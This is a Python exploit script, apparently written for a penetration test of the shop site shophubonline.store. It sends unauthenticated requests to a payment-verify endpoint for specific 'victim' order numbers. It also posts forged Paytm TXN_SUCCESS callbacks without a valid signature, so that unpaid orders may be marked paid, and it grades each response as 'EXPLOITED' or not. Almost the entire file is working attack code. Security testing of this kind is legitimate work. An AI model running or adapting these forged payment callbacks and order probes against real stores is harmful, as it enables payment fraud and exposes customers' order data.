#!/usr/bin/env python3
"""
Security test script for AUTHZ-VULN-05 and AUTHZ-VULN-06
Target: https://shophubonline.store

AUTHZ-VULN-05: Payment verify endpoint lacks guest ownership check
AUTHZ-VULN-06: Paytm callback without HMAC verification
"""

import requests
import json
import time

BASE_URL = "https://shophubonline.store"
KNOWN_ORDER_1 = "ORD-MN9WB6HW-GK92"   # order 16, victim@shophub-test.com
KNOWN_ORDER_2 = "ORD-MN9WDQKW-WIW3"   # order 17, victim2@shophub-test.com

results = []


def separator(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def record_result(test_id, test_name, status_code, response_body,
                  elapsed_ms, classification, notes="", redirect_location=None):
    result = {
        "test_id": test_id,
        "test_name": test_name,
        "status_code": status_code,
        "response_body": response_body,
        "elapsed_ms": elapsed_ms,
        "classification": classification,
        "notes": notes,
        "redirect_location": redirect_location,
    }
    results.append(result)
    print(f"\n[{test_id}] {test_name}")
    print(f"  Status: {status_code}")
    print(f"  Elapsed: {elapsed_ms:.0f}ms")
    if redirect_location:
        print(f"  Redirect-Location: {redirect_location}")
    # Truncate long HTML bodies
    body_preview = response_body
    if body_preview.strip().startswith("<!doctype") or body_preview.strip().startswith("<html"):
        body_preview = "[HTML response - frontend SPA index.html]"
    print(f"  Body: {body_preview[:1200]}")
    print(f"  Classification: {classification}")
    if notes:
        print(f"  Notes: {notes}")
    return result


# ===========================================================================
# AUTHZ-VULN-05 TESTS
# ===========================================================================
separator("AUTHZ-VULN-05: Payment verify endpoint — no guest ownership check")

verify_url = f"{BASE_URL}/api/payment/verify"

# ---------------------------------------------------------------------------
# Test 1: Probe order status — no auth, no email — Razorpay gateway
# ---------------------------------------------------------------------------
separator("Test 1: POST /api/payment/verify — no auth, no email, Razorpay")
payload1 = {
    "orderNumber": KNOWN_ORDER_1,
    "gateway": "razorpay",
    "paymentData": {
        "razorpay_order_id": "fake_order_id",
        "razorpay_payment_id": "fake_payment_id",
        "razorpay_signature": "fake_signature"
    }
}
headers_json = {"Content-Type": "application/json"}

start = time.time()
try:
    resp1 = requests.post(verify_url, json=payload1, headers=headers_json, timeout=30)
    elapsed1 = (time.time() - start) * 1000
    body1 = resp1.text
except Exception as e:
    elapsed1 = (time.time() - start) * 1000
    resp1 = None
    body1 = f"REQUEST_ERROR: {e}"

if resp1 is not None:
    if resp1.status_code in (401, 403):
        cls1 = "BLOCKED_BY_SECURITY"
    else:
        b1 = body1.lower()
        leaks = ["order", "payment", "status", "amount", "email", "customer", "verified"]
        if any(k in b1 for k in leaks):
            cls1 = "EXPLOITED"
        else:
            cls1 = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-05-T1", "Verify order without auth — Razorpay",
                  resp1.status_code, body1, elapsed1, cls1,
                  notes="No auth headers, no cookie, no email supplied.")
else:
    record_result("AUTHZ-VULN-05-T1", "Verify order without auth — Razorpay",
                  "N/A", body1, elapsed1, "ERROR")

# ---------------------------------------------------------------------------
# Test 2: Probe same order — Paytm gateway
# ---------------------------------------------------------------------------
separator("Test 2: POST /api/payment/verify — no auth, Paytm gateway")
payload2 = {
    "orderNumber": KNOWN_ORDER_1,
    "gateway": "paytm",
    "paymentData": {"txnId": "fake_txn_id"}
}

start = time.time()
try:
    resp2 = requests.post(verify_url, json=payload2, headers=headers_json, timeout=30)
    elapsed2 = (time.time() - start) * 1000
    body2 = resp2.text
except Exception as e:
    elapsed2 = (time.time() - start) * 1000
    resp2 = None
    body2 = f"REQUEST_ERROR: {e}"

if resp2 is not None:
    if resp2.status_code in (401, 403):
        cls2 = "BLOCKED_BY_SECURITY"
    else:
        b2 = body2.lower()
        leaks2 = ["order", "payment", "status", "amount", "email", "customer", "verified"]
        cls2 = "EXPLOITED" if any(k in b2 for k in leaks2) else "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-05-T2", "Verify order without auth — Paytm",
                  resp2.status_code, body2, elapsed2, cls2,
                  notes="No auth. Gateway=paytm.")
else:
    record_result("AUTHZ-VULN-05-T2", "Verify order without auth — Paytm",
                  "N/A", body2, elapsed2, "ERROR")

# ---------------------------------------------------------------------------
# Test 3: Second known order — victim2, Razorpay, no auth
# ---------------------------------------------------------------------------
separator("Test 3: POST /api/payment/verify — second victim order, no auth")
payload3 = {
    "orderNumber": KNOWN_ORDER_2,
    "gateway": "razorpay",
    "paymentData": {
        "razorpay_order_id": "fake_order_id_2",
        "razorpay_payment_id": "fake_payment_id_2",
        "razorpay_signature": "fake_signature_2"
    }
}

start = time.time()
try:
    resp3 = requests.post(verify_url, json=payload3, headers=headers_json, timeout=30)
    elapsed3 = (time.time() - start) * 1000
    body3 = resp3.text
except Exception as e:
    elapsed3 = (time.time() - start) * 1000
    resp3 = None
    body3 = f"REQUEST_ERROR: {e}"

if resp3 is not None:
    if resp3.status_code in (401, 403):
        cls3 = "BLOCKED_BY_SECURITY"
    else:
        b3 = body3.lower()
        leaks3 = ["order", "payment", "status", "amount", "email", "customer", "verified"]
        cls3 = "EXPLOITED" if any(k in b3 for k in leaks3) else "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-05-T3", "Verify second victim order without auth",
                  resp3.status_code, body3, elapsed3, cls3,
                  notes=f"Order {KNOWN_ORDER_2} (victim2). No auth/email.")
else:
    record_result("AUTHZ-VULN-05-T3", "Verify second victim order without auth",
                  "N/A", body3, elapsed3, "ERROR")

# ---------------------------------------------------------------------------
# Test 3b: Non-existent order — baseline for distinguishing valid vs invalid
# ---------------------------------------------------------------------------
separator("Test 3b: POST /api/payment/verify — non-existent order (baseline)")
payload3b = {
    "orderNumber": "ORD-DOESNOTEXIST-0000",
    "gateway": "razorpay",
    "paymentData": {
        "razorpay_order_id": "fake",
        "razorpay_payment_id": "fake",
        "razorpay_signature": "fake"
    }
}

start = time.time()
try:
    resp3b = requests.post(verify_url, json=payload3b, headers=headers_json, timeout=30)
    elapsed3b = (time.time() - start) * 1000
    body3b = resp3b.text
except Exception as e:
    elapsed3b = (time.time() - start) * 1000
    resp3b = None
    body3b = f"REQUEST_ERROR: {e}"

if resp3b is not None:
    record_result("AUTHZ-VULN-05-T3b",
                  "Verify NON-EXISTENT order (baseline, status code/message comparison)",
                  resp3b.status_code, body3b, elapsed3b, "BASELINE",
                  notes="Compare status code and body with valid orders above.")
else:
    record_result("AUTHZ-VULN-05-T3b", "Verify NON-EXISTENT order (baseline)",
                  "N/A", body3b, elapsed3b, "ERROR")


# ===========================================================================
# AUTHZ-VULN-06 TESTS
# ===========================================================================
separator("AUTHZ-VULN-06: Paytm callback without HMAC verification")

callback_url = f"{BASE_URL}/api/payment/paytm-callback"

# NOTE: The paytm-callback endpoint always redirects to the frontend SPA —
# it never returns JSON. We test with allow_redirects=False to capture the
# actual API server response (HTTP 302 + Location header) rather than
# following through to the SPA HTML.

# ---------------------------------------------------------------------------
# Test 4a: Fabricated Paytm callback — form-encoded, TXN_SUCCESS
# ---------------------------------------------------------------------------
separator("Test 4a: POST /api/payment/paytm-callback — TXN_SUCCESS, form-encoded (no redirect follow)")
form_payload4a = {
    "ORDERID": KNOWN_ORDER_1,
    "STATUS": "TXN_SUCCESS",
    "TXNID": "FAKE_TXN_123",
    "TXNAMOUNT": "100"
}

start = time.time()
try:
    resp4a = requests.post(callback_url, data=form_payload4a,
                           headers={"Content-Type": "application/x-www-form-urlencoded"},
                           allow_redirects=False, timeout=30)
    elapsed4a = (time.time() - start) * 1000
    body4a = resp4a.text
    loc4a = resp4a.headers.get("Location", "")
except Exception as e:
    elapsed4a = (time.time() - start) * 1000
    resp4a = None
    body4a = f"REQUEST_ERROR: {e}"
    loc4a = ""

if resp4a is not None:
    if resp4a.status_code in (401, 403):
        cls4a = "BLOCKED_BY_SECURITY"
    elif resp4a.status_code in (301, 302, 303, 307, 308):
        # Endpoint is reachable and processed. Check redirect destination.
        loc_lower = loc4a.lower()
        if "order-success" in loc_lower or "orders" in loc_lower:
            # The endpoint processed the request (redirected to frontend)
            cls4a = "EXPLOITED"
        else:
            cls4a = "FALSE_POSITIVE"
    elif resp4a.status_code == 500:
        cls4a = "EXPLOITED"  # Server processed it, hit internal error — still reachable
    else:
        cls4a = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-06-T4a",
                  "Paytm callback — TXN_SUCCESS, form-encoded",
                  resp4a.status_code, body4a, elapsed4a, cls4a,
                  notes=f"allow_redirects=False. Delay >2000ms implies external Paytm API call.",
                  redirect_location=loc4a)
else:
    record_result("AUTHZ-VULN-06-T4a", "Paytm callback — TXN_SUCCESS form-encoded",
                  "N/A", body4a, elapsed4a, "ERROR")

# ---------------------------------------------------------------------------
# Test 4b: Fabricated Paytm callback — JSON body, TXN_SUCCESS
# ---------------------------------------------------------------------------
separator("Test 4b: POST /api/payment/paytm-callback — TXN_SUCCESS, JSON (no redirect follow)")
json_payload4b = {
    "ORDERID": KNOWN_ORDER_1,
    "STATUS": "TXN_SUCCESS",
    "TXNID": "FAKE_TXN_123",
    "TXNAMOUNT": "100"
}

start = time.time()
try:
    resp4b = requests.post(callback_url, json=json_payload4b,
                           headers={"Content-Type": "application/json"},
                           allow_redirects=False, timeout=30)
    elapsed4b = (time.time() - start) * 1000
    body4b = resp4b.text
    loc4b = resp4b.headers.get("Location", "")
except Exception as e:
    elapsed4b = (time.time() - start) * 1000
    resp4b = None
    body4b = f"REQUEST_ERROR: {e}"
    loc4b = ""

if resp4b is not None:
    if resp4b.status_code in (401, 403):
        cls4b = "BLOCKED_BY_SECURITY"
    elif resp4b.status_code in (301, 302, 303, 307, 308):
        loc_lower = loc4b.lower()
        cls4b = "EXPLOITED" if ("order-success" in loc_lower or "orders" in loc_lower) else "FALSE_POSITIVE"
    elif resp4b.status_code == 500:
        cls4b = "EXPLOITED"
    else:
        cls4b = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-06-T4b",
                  "Paytm callback — TXN_SUCCESS, JSON",
                  resp4b.status_code, body4b, elapsed4b, cls4b,
                  notes="allow_redirects=False.",
                  redirect_location=loc4b)
else:
    record_result("AUTHZ-VULN-06-T4b", "Paytm callback — TXN_SUCCESS JSON",
                  "N/A", body4b, elapsed4b, "ERROR")

# ---------------------------------------------------------------------------
# Test 5: TXN_FAILURE branch — check if the failure path is reachable
# ---------------------------------------------------------------------------
separator("Test 5: POST /api/payment/paytm-callback — TXN_FAILURE (no redirect follow)")
json_payload5 = {
    "ORDERID": KNOWN_ORDER_1,
    "STATUS": "TXN_FAILURE",
    "TXNID": "FAKE_TXN_456"
}

start = time.time()
try:
    resp5 = requests.post(callback_url, data=json_payload5,
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          allow_redirects=False, timeout=30)
    elapsed5 = (time.time() - start) * 1000
    body5 = resp5.text
    loc5 = resp5.headers.get("Location", "")
except Exception as e:
    elapsed5 = (time.time() - start) * 1000
    resp5 = None
    body5 = f"REQUEST_ERROR: {e}"
    loc5 = ""

if resp5 is not None:
    if resp5.status_code in (401, 403):
        cls5 = "BLOCKED_BY_SECURITY"
    elif resp5.status_code in (301, 302, 303, 307, 308):
        loc_lower = loc5.lower()
        cls5 = "EXPLOITED" if ("order-success" in loc_lower or "orders" in loc_lower) else "FALSE_POSITIVE"
    else:
        cls5 = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-06-T5",
                  "Paytm callback — TXN_FAILURE (failure branch reachability)",
                  resp5.status_code, body5, elapsed5, cls5,
                  notes="Testing TXN_FAILURE branch. allow_redirects=False.",
                  redirect_location=loc5)
else:
    record_result("AUTHZ-VULN-06-T5", "Paytm callback — TXN_FAILURE",
                  "N/A", body5, elapsed5, "ERROR")

# ---------------------------------------------------------------------------
# Test 6: Second victim order — TXN_SUCCESS, form-encoded
# ---------------------------------------------------------------------------
separator("Test 6: POST /api/payment/paytm-callback — second victim order, TXN_SUCCESS")
form_payload6 = {
    "ORDERID": KNOWN_ORDER_2,
    "STATUS": "TXN_SUCCESS",
    "TXNID": "FAKE_TXN_789",
    "TXNAMOUNT": "200"
}

start = time.time()
try:
    resp6 = requests.post(callback_url, data=form_payload6,
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          allow_redirects=False, timeout=30)
    elapsed6 = (time.time() - start) * 1000
    body6 = resp6.text
    loc6 = resp6.headers.get("Location", "")
except Exception as e:
    elapsed6 = (time.time() - start) * 1000
    resp6 = None
    body6 = f"REQUEST_ERROR: {e}"
    loc6 = ""

if resp6 is not None:
    if resp6.status_code in (401, 403):
        cls6 = "BLOCKED_BY_SECURITY"
    elif resp6.status_code in (301, 302, 303, 307, 308):
        loc_lower = loc6.lower()
        cls6 = "EXPLOITED" if ("order-success" in loc_lower or "orders" in loc_lower) else "FALSE_POSITIVE"
    else:
        cls6 = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-06-T6",
                  "Paytm callback — second victim order TXN_SUCCESS",
                  resp6.status_code, body6, elapsed6, cls6,
                  notes=f"Order {KNOWN_ORDER_2}. allow_redirects=False.",
                  redirect_location=loc6)
else:
    record_result("AUTHZ-VULN-06-T6", "Paytm callback — second victim order TXN_SUCCESS",
                  "N/A", body6, elapsed6, "ERROR")

# ---------------------------------------------------------------------------
# Test 7: TXN_SUCCESS with second order via JSON
# ---------------------------------------------------------------------------
separator("Test 7: POST /api/payment/paytm-callback — second victim order, TXN_SUCCESS, JSON")
json_payload7 = {
    "ORDERID": KNOWN_ORDER_2,
    "STATUS": "TXN_SUCCESS",
    "TXNID": "FAKE_TXN_789",
    "TXNAMOUNT": "200"
}

start = time.time()
try:
    resp7 = requests.post(callback_url, json=json_payload7,
                          headers={"Content-Type": "application/json"},
                          allow_redirects=False, timeout=30)
    elapsed7 = (time.time() - start) * 1000
    body7 = resp7.text
    loc7 = resp7.headers.get("Location", "")
except Exception as e:
    elapsed7 = (time.time() - start) * 1000
    resp7 = None
    body7 = f"REQUEST_ERROR: {e}"
    loc7 = ""

if resp7 is not None:
    if resp7.status_code in (401, 403):
        cls7 = "BLOCKED_BY_SECURITY"
    elif resp7.status_code in (301, 302, 303, 307, 308):
        loc_lower = loc7.lower()
        cls7 = "EXPLOITED" if ("order-success" in loc_lower or "orders" in loc_lower) else "FALSE_POSITIVE"
    else:
        cls7 = "FALSE_POSITIVE"
    record_result("AUTHZ-VULN-06-T7",
                  "Paytm callback — second victim TXN_SUCCESS JSON",
                  resp7.status_code, body7, elapsed7, cls7,
                  notes=f"Order {KNOWN_ORDER_2} via JSON. allow_redirects=False.",
                  redirect_location=loc7)
else:
    record_result("AUTHZ-VULN-06-T7", "Paytm callback — second victim TXN_SUCCESS JSON",
                  "N/A", body7, elapsed7, "ERROR")


# ===========================================================================
# FINAL SUMMARY
# ===========================================================================
separator("FINAL SUMMARY")

print("\n{:<25} {:<8} {:<10} {:<35} {}".format(
    "Test ID", "HTTP", "Elapsed", "Classification", "Redirect Location"))
print("-" * 100)
for r in results:
    loc_display = (r.get("redirect_location") or "")[:60]
    print("{:<25} {:<8} {:<10} {:<35} {}".format(
        r["test_id"],
        str(r["status_code"]),
        f"{r['elapsed_ms']:.0f}ms",
        r["classification"],
        loc_display
    ))

# --- AUTHZ-VULN-05 verdict ---
v05_tests = [r for r in results if "AUTHZ-VULN-05" in r["test_id"]]
v05_exploited = [r for r in v05_tests if r["classification"] == "EXPLOITED"]
v05_blocked = [r for r in v05_tests if r["classification"] == "BLOCKED_BY_SECURITY"]

print("\n--- AUTHZ-VULN-05 verdict ---")
if v05_exploited:
    print(f"VERDICT: EXPLOITED")
    print(f"  {len(v05_exploited)} test(s) returned order data without any authentication or email proof:")
    for r in v05_exploited:
        print(f"  - [{r['test_id']}] HTTP {r['status_code']}: {r['response_body'][:300]}")
elif v05_blocked:
    print(f"VERDICT: BLOCKED_BY_SECURITY ({len(v05_blocked)} test(s) returned 401/403)")
else:
    print("VERDICT: FALSE_POSITIVE (no order data leaked, no explicit auth block)")

# --- AUTHZ-VULN-06 verdict ---
v06_tests = [r for r in results if "AUTHZ-VULN-06" in r["test_id"]]
v06_exploited = [r for r in v06_tests if r["classification"] == "EXPLOITED"]
v06_blocked = [r for r in v06_tests if r["classification"] == "BLOCKED_BY_SECURITY"]

print("\n--- AUTHZ-VULN-06 verdict ---")
if v06_exploited:
    print(f"VERDICT: EXPLOITED")
    print(f"  {len(v06_exploited)} test(s) showed the callback endpoint processed the forged request:")
    for r in v06_exploited:
        print(f"  - [{r['test_id']}] HTTP {r['status_code']} -> Location: {r.get('redirect_location')}")
        print(f"    Body: {r['response_body'][:200]}")
elif v06_blocked:
    print(f"VERDICT: BLOCKED_BY_SECURITY ({len(v06_blocked)} test(s) returned 401/403)")
else:
    print("VERDICT: FALSE_POSITIVE (callback endpoint rejected all probes — all tests returned HTML or non-redirect)")
    print("  Possible causes: nginx not routing /api/payment/paytm-callback, or route is different")

# Timing analysis
print("\n--- Timing Analysis (AUTHZ-VULN-06 — external Paytm API call detection) ---")
for r in v06_tests:
    if r["elapsed_ms"] > 2000:
        print(f"  {r['test_id']}: {r['elapsed_ms']:.0f}ms — LIKELY made external API call to Paytm")
    else:
        print(f"  {r['test_id']}: {r['elapsed_ms']:.0f}ms — fast (probably rejected early or not routed)")

print("\n[Done]")
